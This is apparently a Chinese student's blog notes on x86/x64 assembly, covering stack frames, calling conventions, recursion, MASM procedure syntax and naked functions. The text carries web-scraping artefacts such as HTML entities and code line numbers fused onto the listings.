casemap:none;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data .data;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .codestart:\tcall\tmy\tinvoke\tExitProcess,NULL\tmy\tproc local\tarr[10]:word ret\tmy\tendp;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\tend\tstart 在IDA里面 12345678910; Attributes: bp-based framefun proc nearpush ebpmov ebp, espadd esp, 0FFFFFFEChleaveretnfun endp lahf&#x2F;sahf12lahf 把寄存器的低8位给了ahsahf 把ah给了寄存器的低8位 变量声明与初始化&#x2F;存储位置全局变量全局变量在data区 1234567.data:00403004 public _str.data:00403004 ; char str[].data:00403004 _str db &#x27;Dqx+Gh0st&#x27;,0 ; DATA XREF: _main+26↑o.data:0040300E align 10h .data:00403010 public __charmax.data:00403010 ; int _charmax.data:00403010 __charmax dd 255 可以看到.数据在data区域 我定义的数组长度是10,然后它 align 10h进行了10字节对齐 main函数定义的变量只能在main区域使用,也叫局部变量 在函数外定义的变量才叫全局变量,不知道说对了没有 全局变量的调用,一是去data区取地址,用esp把地址放在栈区 1mov dword ptr [esp], offset _str ; &quot;Dqx+Gh0st&quot; main变量12345678910#include &lt;stdio.h&gt;int main(void)&#123;\tint x=4,y=5,z=6; char temp[15]=&quot;Dqx-20019&quot;; printf(temp);\treturn 0;&#125; 32位 123456789101112//int的初始化mov dword ptr [esp+44], 4mov dword ptr [esp+40], 5mov dword ptr [esp+36], 6//字符串初始化mov dword ptr [esp+21], 2D787144hmov dword ptr [esp+25], 31303032hmov dword ptr [esp+29], 39h ; &#x27;9&#x27;mov word ptr [esp+33], 0mov byte ptr [esp+35], 0//可以看到数据放在了.text区域//然后放在了esp高栈位 1234lea eax, [esp+21]mov [esp], eax ; Formatcall _printf//数据的使用就放在了低栈位 64位 局部变量[ebp-n]的为局部变量 x64的局部变量声明好比这样一个子函数 12345678910111213141516171819202122circle:\tsection .data .fmt_area\tdb\t&quot;The area is %f&quot;,10,0 .fmt_circum\tdb\t&quot;The circumference is %f&quot;,10,0 section .text push rbp\tmov rbp, rsp call area mov\trdi,.fmt_area mov\trax,1 ; area in xmm0 call printf call circum mov\trdi,.fmt_circum mov\trax,1 ; circumference in xmm0 call printf leave\tret 局部变量的名字带有一个点. 在section .data声明 然后不要忘记section .text写代码 子函数的使用为什么有子函数这个东西使用子程序 为什么使用子程序?就好比为什么使用函数一样? 当一个过程.. ①,比较繁琐 ②.需要移植到很多处地方重复使用 那么我们就把它封装为一个函数 一个简单的函数栈建立 123456789101112131415161718192021222324252627282930313233;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .386 .model flat,stdcall option casemap:none;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include windows.incinclude kernel32.incincludelib\tkernel32.lib;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data .data;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .codestart:\tcall\tmy\tinvoke\tExitProcess,NULL\tmy\tproc push\tebp mov\tebp,esp sub\tesp,8 mov\tdword ptr [ebp-4],10 mov\tdword ptr [ebp-8],20 mov\tesp,ebp ;add\tesp,8 ;add 和这里的 mov 的效果是一样的 pop\tebp ret\tmy\tendp;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\tend\tstart 写汇编的时候,局部变量使用符号… 12345678910111213x\tequ\tdword ptr [ebp-4]y\tequ\tdword ptr [ebp-8]\tmy\tproc push\tebp mov ebp,esp sub esp,8 mov x,10 mov y,20 mov esp,ebp pop ebp ret\tmy\tendp 有些离谱的传入参数 123mov dword ptr [esp+4], 3mov dword ptr [esp], 2call func 其实上面2菊花等价于 12push 3push 2 push 3可以让dword ptr [esp+4]&#x3D;3 push 2可以让dword ptr [esp+0],&#x3D;2 为什么会有ebp的寻址ebp获取的数据都是传入的参数,而参数的使用需要转移到esp中 我还不知道为什么要这么复杂 调用子函数前我们push 了2次,push 2,push 3 假设函数开辟了3*4字节.push ebp,mov ebp,esp,sub esp,12 esp+0&#x2F;&#x2F;sub esp,12 esp+4 esp+8 ebp&#x2F;/push ebp A old ebp Next IP&#x2F;&#x2F;cal func 0xbalablalbla A old esp+4&#x2F;&#x2F;push3 3 A old esp&#x2F;&#x2F;push 2 2 所以的话要传递2,3的话 就用[ebp+8]和[ebp+12]来获取,传入函数栈用eax媒介,然后使用esp来最终的使用 参数传递与返回值传递参数传递的本质 把原来的数据复制一份到堆栈,然后对堆栈里面的数据进行操作 所以这就解决了形参和实参的问题 在masm32中 123456sub3\tproc\tsysCall,c_var1,c_var2;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; push 1 push 2 call sub3 ;invlok sub3 C,var1,var2//不知道为什么这样写不可以 在栈中传递参数 ①.push到栈里面 ②.直接mov [esp+xxx],num,向栈里面直接写入数据.其实它等价于第一种 ③. 通过寄存器传递参数 如何在32位下传入一个64位的参数??? Way-1 12345sub esp,8fld xxxfstp qword ptr [esp]call funcadd esp,8 把栈顶指针做一些修改就可以了 Way-2 先把高4字节入栈 再把低4字节入栈 如何在32位环境下,返回一个64位的值 将结果拆分为2个32位的,然后分别放在eax,edx 在外面的时候,把eax,edx整合在栈中 12mov [ebp-4],eaxmov [ebp-8],edx 传递的规律参数是从 ebp+8开始 局部变量是从 ebp-4开始的 参数的传递是放在了堆栈里面 是4个字节放一个参数 12345678910111213141516//基于缓冲区溢出的HelloWorld#include&lt;stdio.h&gt;int main()&#123;\tint x1 = 1;\tint x2 = 2;\tint x3 = 3;\tint arr[3] = &#123; 6,7,8&#125;;\tint x4 = 4;\tchar str[10] = &#123;9,7,7,7,7,7,7,7,7,10 &#125;;\treturn 0;&#125; 最先声明的 离 ebp最近 1234567891011121314151617181920212223240019FE90 CCCCCCCC 0019FE94 07070709 str[0,3]0019FE98 07070707 str[4,7]0019FE9C CCCC0A07 str[8,9] 余下2位是CC0019FEA0 CCCCCCCC 0019FEA4 CCCCCCCC 0019FEA8 00000004 x40019FEAC CCCCCCCC 0019FEB0 CCCCCCCC 0019FEB4 00000006 arr[0]0019FEB8 00000007 arr[1]0019FEBC 00000008 arr[2]0019FEC0 CCCCCCCC 0019FEC4 CCCCCCCC 0019FEC8 00000003 x30019FECC CCCCCCCC 0019FED0 CCCCCCCC 0019FED4 00000002 x20019FED8 CCCCCCCC 0019FEDC CCCCCCCC 0019FEE0 00000001 x10019FEE4 CCCCCCCC 0019FEE8 0019FF08 Stack[000027E0]:0 ebp0019FEEC 00411F23 invoke_main+33 eip 子函数的定义子程序的定义 12345678910111213141516//函数的声明函数名字\tproto\t[距离][调用方式][可视区域][uses 寄存器列表][参数名称:参数类型,参数名称:参数类;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;//函数的定义函数的名字 proc [距离][调用方式][可视区域][uses 寄存器列表][参数名称:参数类型,参数名称:参数类型][vararg] local 局部变量 指令 函数的名字 endp;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;//函数的调用 push xx call yy 或者用invoke指令;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 详情见&lt;&lt;琢式成器&gt;&gt;.Page-75 距离:\t…决定了最后的ret的指令是哪种类型,好比retf,retn..???? 调用方式:\t好比stdcall,子函数的调用方式一般是缺省的,与源代码前面的option保持一致 可视化区域;\t…可能就是什么私有公开权限啥的 uses寄存器:\t可以以查看一下uses的伪指令 参数名称与参数列表:\t现在还不会用… vararg:一个参数的扩展 子程序的声明 联想一下C语言 1234567891011#include&lt;stdio.h&gt;void fun();int main()&#123;\tfunc();\treturn 0;&#125;void func()&#123;&#125; 如果你不声明一下函数的话,main函数的fun()是无法使用的…除非你把fun()函数写在了main()之前 对于win32的函数同样如此 win32的报错会是error a2006:undefined symbol:找不到程序名 于是此刻你要像C语言一样函数声明,那你就要用到proto指令 1MessageBox Proto hwnd:dword, text:dword,title:dword,Type:dword, 函数的返回值若是32位的程序,一般通过eax寄存器返回 若是64位,一般通过edx和eax寄存器返回 若是浮点数,用st(0)返回 如果函数不写return的话 计算的临时结果就hi放弃在栈里面 写了return ,计算的结果就会存入eax x64的函数调用首先参数的不是靠栈的传递 对于内置函数,他又一套专门的寄存器传参 对DIY的函数,你的传的参数取决与你子函数要用哪个寄存器 非浮点数 6个参数以内 参数传递的顺序 rdi,rsi,rdx,rcx,r8,r9 第7个参数以外,假设有10个,从右边往左边压入 压入第10个,压入第9个….压入第7个 1234567891011121314mov rdi,fmt1\tmov rsi, first ; the correct registersmov rdx, secondmov rcx, third mov r8, fourth mov r9, fifth push tenth ; now start pushing in push ninth ; reverse order push eighth\tpush seventhpush sixthmov rax, 0call printf 浮点数 通过xmm寄存器传递 第一个是xmm0 第二个是xmm1 依次类推 例子递归求和1234567891011121314151617181920212223242526272829303132333435363738;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .386 .model flat,stdcall option casemap:none;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data .data;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .codestart:\tmov ecx,6\t; count = 10\tmov eax,0\t; holds the sum\t;------------------------------------------\t;传入的参数ecx,eax\t;功能,实现6一直加到1\t;eax是累加值\t;-------------------------------------------\tcall CalcSum\tinvoke\tExitProcess,NULL;--------------------------------------------------------CalcSum PROC\tcmp ecx,0 jz L2 add eax,ecx dec ecx call CalcSum ;每次调用都会不断的push IP of ret ;一旦pop 出去就会返回一个函数L2:\tretCalcSum ENDP;--------------------------------------------------------\tend\tstart 看一下函数栈 1234560019FF5C | 00401023 | sub_401016:locret_4010230019FF60 | 00401023 | sub_401016:locret_4010230019FF64 | 00401023 | sub_401016:locret_4010230019FF68 | 00401023 | sub_401016:locret_4010230019FF6C | 00401023 | sub_401016:locret_4010230019FF70 | 00401023 | sub_401016:locret_401023 你会发现栈里面的数据都是ret的地址,一旦达到函数的返回条件,他就不断的把ret的地址pop 到IP 阶乘我的阶乘.有点简单 12345678910111213141516171819202122232425262728293031;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .386 .model flat,stdcall option casemap:none;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data .data;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .codestart:\tmov\teax,5\tmov\tebx,eax\tcall\tfunc\tinvoke\tExitProcess,NULL;--------------------------------------------------------func PROC\tdec\tebx\tcmp\tebx,0\tjz\tover\tmul\tebx\tcall\tfuncover:\tretfunc ENDP;--------------------------------------------------------\tend\tstart 整体实现的一个流程是 eax–,然后不断的push eax 直到eax&#x3D;0,就让eax&#x3D;1,开始在栈里面取数据做乘法 对书上的理解,我又写的 123456789101112131415161718192021222324252627282930313233343536373839404142434445;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .386 .model flat,stdcall option casemap:none;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data .data;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .codestart:\tpush\t5\tcall\tfunc\tinvoke\tExitProcess,NULL;--------------------------------------------------------func PROC\tpush\tebp\tmov\tebp,esp\tmov\teax,[ebp+8]\tcmp\teax,1\tjz\tq1\tdec\teax\tpush\teax\tcall\tfunc\tmov\tebx,[ebp+8]\tmul\tebxq1: pop\tebp\tretn\t4\t;为什么pop ;ebp?为了让eip指向返回地址\t;为什么ebx,[ebp+8]\t;因为完全进入了一个完整的函数,参数的获取\t;怎么保持的栈平衡?让eip指向了正确的地址\t;为什么是retn 4\t;为了让esp指ebp的位置\tfunc ENDP;--------------------------------------------------------\tend\tstart 书上的方法,很妙’很复杂 ‘ 123456789101112131415161718192021222324252627282930313233343536373839404142;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .386 .model flat,stdcall option casemap:none;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data .data;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .codestart:\tpush\t5\tcall\tfunc\tinvoke\tExitProcess,NULL;--------------------------------------------------------func PROC\tpush ebp\tmov ebp,esp\tmov eax,[ebp+8] cmp eax,0 ja break_up mov eax,1 jmp okbreak_up:\tdec eax\tpush eax call funcbegin_mul:\tmov ebx,[ebp+8] mul ebx\tok:\tpop ebp ret 4\t;pop ip\t;esp+=4func ENDP;--------------------------------------------------------\tend\tstart x64 计数圆的周长&#x2F;面积12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697section .data radius\tdq\t10.0 ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\tsection .bss;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\tsection .text\textern printf extern areaextern circumextern circle global main main: mov rbp, rsp; for correct debugging;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx mov rbp, rsp;\tpush rbp\tmov rbp, rsp call circle leave\tret ;------------------------------------------------------\tcircle:\tsection .data .fmt_area\tdb\t&quot;The area is %f&quot;,10,0 .fmt_circum\tdb\t&quot;The circumference is %f&quot;,10,0\tsection .text push rbp\tmov rbp, rsp call area mov\trdi,.fmt_area mov\trax,1 ; area in xmm0 call printf call circum mov\trdi,.fmt_circum mov\trax,1 ; circumference in xmm0 call printf leave\tret;----------------------------------------------------;function name:area；no var get in；proc: calc PI x R^2；return xmm0area:\tsection .data .pi\tdq\t3.141592654\t; local to area\tsection .text push rbp\tmov rbp, rsp movsd xmm0, [radius] mulsd xmm0, [radius] mulsd xmm0, [.pi] leave\tret;----------------------------------------------------;fuction name:circum;no var get in;proc: 2*PI*R;return xmm0circum:\tsection .data .pi\tdq\t3.14 ; local to circum\tsection .text push rbp\tmov rbp, rsp movsd xmm0, [radius] addsd xmm0, [radius] mulsd xmm0, [.pi] leave\tret;---------------------------------------------------- 裸函数导入123456789101112void __declspec(naked) Function() &#123;\t...&#125; 上面的函数调用时，为什么会出错？ void __declspec(naked) Function() &#123; __asm ret &#125; 对于第一种裸函数的写法,编译器不会给你生成任何东西,就连ret都不会给你生成 所以对于空的裸函数,你要写上ret 无参数和返回值的裸函数12345678910111213141516171819202122232425void __declspec(naked) Function() &#123; __asm &#123; push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ds:[ebp-0x40] mov eax,0xCCCCCCCC mov ecx,0x10 rep stosd pop edi pop esi pop ebx mov esp,ebp pop ebp ret &#125; &#125; 有参数和返回值12345678910111213141516171819202122232425262728int __declspec(naked) Function(int x,int y) //实现x+y &#123; __asm &#123; push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ds:[ebp-0x40] mov eax,0xCCCCCCCC mov ecx,0x10 rep stosd mov eax,dword ptr ds:[ebp+8] add eax,dword ptr ds:[ebp+0xC] pop edi pop esi pop ebx mov esp,ebp pop ebp ret &#125; &#125; 带局部变量的裸函数12345678910111213141516171819202122232425262728293031 int __declspec(naked) Function(int x,int y) &#123; __asm &#123; push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ds:[ebp-0x40] mov eax,0xCCCCCCCC mov ecx,0x10 rep stosd mov dword ptr ds:[ebp-4],2 mov dword ptr ds:[ebp-8],3 mov eax,dword ptr ds:[ebp+8] add eax,dword ptr ds:[ebp+0xC] pop edi pop esi pop ebx mov esp,ebp pop ebp ret &#125; &#125; MS-Windows可以对比一下你8086学的int21h的ah&#x3D;9,或者其它之类的中断…… 8086的中断比较晦涩难懂 win32的API就比较好理解一些 有的API是有返回值的 如果返回值是32位寄存器放得下的,那么一定放在eax中,如果放不下 情况1,eax放一个返回值的指针 情况2,返回值到了buff区域 数据类型表 MS-Windows 类型 MASM类型 说明 BOOL, BOOLEAN DWORD 